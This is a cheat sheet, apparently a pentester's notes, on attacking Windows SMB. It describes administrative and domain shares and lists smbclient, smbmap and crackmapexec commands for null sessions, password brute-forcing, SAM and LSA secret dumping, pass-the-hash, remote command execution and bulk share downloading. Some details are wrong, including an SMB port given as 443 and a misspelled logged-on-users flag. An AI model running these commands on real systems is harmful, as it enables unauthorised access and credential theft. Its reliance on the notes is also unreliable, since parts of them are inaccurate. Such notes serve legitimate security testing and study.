- Server Message Block.
- Used to share folders, printers, resources.
- Works over
	- Port 139 over NetBIOS (Older machines)
	- Port 443 over TCP
# Shares
Folders that a machine shares in order to be accessed by other computer/users.
### ADMIN$
- The `%SystemRoot%` directory of the machine. Only accessible to Administrators of the machine.
### C$
- The C:\ drive of the machine, only accessible to Administrators of that machine.
### IPC$
- A special share that is used `Inter Process Communication` used by [MSRPC](MSRPC.md).
- Performs actions such as:
	- List all shares
	- List all users
	- List files within a share
	- Start/stop services
### SYSVOL
- A special share in domain controllers that stores [Group Policy](../AD%20Basics/Group%20Policy.md), scripts, junction point.
### NETLOGON
- This share is used to store logon scripts (executes when user logs in) and other files.

# Enumeration
### smbclient
FTP-like client for SMB 
```bash
# List Shares
smbclient -U "[domain\]username%password" -L //<hostname/IP>
# Connect to a share
smbclient -U "[domain\]username%password" //<hostname/IP>/C$
# Anonymous Login/Null Session
smbclient --no-pass -L //<hostname/IP>
smbclient -U "%" -L //<hostname/IP>
```
### enum4linux
```bash
enum4linux -a -u <username> -p <password> <target>
```
### smbmap.py
```bash
smbmap.py -H <target> [options]
```
- `-u <username>`
- `-p <password>
- `-r <sharename>` : list content of the share
- `-x <command>` : execute command remotely
- `--upload <file> <sharepath>` : upload to file share
- `--down <file>` : download from file share
### crackmapexec
```bash
# List shares
cme smb <target> -u <username> -p <password>
# Test null session
cme smb <target> -u '' -p '' --shares

# Brute force passwords 
cme smb <target> -u ./user.txt -p ./pass.txt
cme smb <target> -u ./user.txt -p ./pass.txt --continue-on-success

# list shares
cme smb <target> -u <username> -p <password> --shares
# dump sam database of the target
cme smb <target> -u <username> -p <password> --sam
# dump lsa secrets from lsass memory
cme smb <target> -u <username> -p <password> --lsa
# get sessions
cme smb <target> -u <username> -p <password> --sessions
# Get loggedon users
cme smb <target> -u <username> -p <password> --loggonon-users
# list disks
cme smb <target> -u <username> -p <password> --disks
# list users
cme smb <target> -u <username> -p <password> --users
# list groups
cme smb <target> -u <username> -p <password> --groups
# list local groups
cme smb <target> -u <username> -p <password> --local-groups
# list password policy
cme smb <target> -u <username> -p <password> --pass-pol

# Execute commands
cme smb <target> -u <username> -p <password> -x 'command' # CMD
cme smb <target> -u <username> -p <password> -X 'powershell' # CMD

# Pass the hash
cme smb <target> -u <username> -H <hash>

# list smb modules
cme smb -L
# Use modules
cme smb <target> <option> -M <module_name>
```
### Cloning entire share
```bash
smbclient //domain.loc/sharename
smb: \> RECURSE ON # set recursive to on
smb: \> PROMPT OFF # do no ask y/n for every directory
smb: \> mget * # get everyhing * = wildcard
```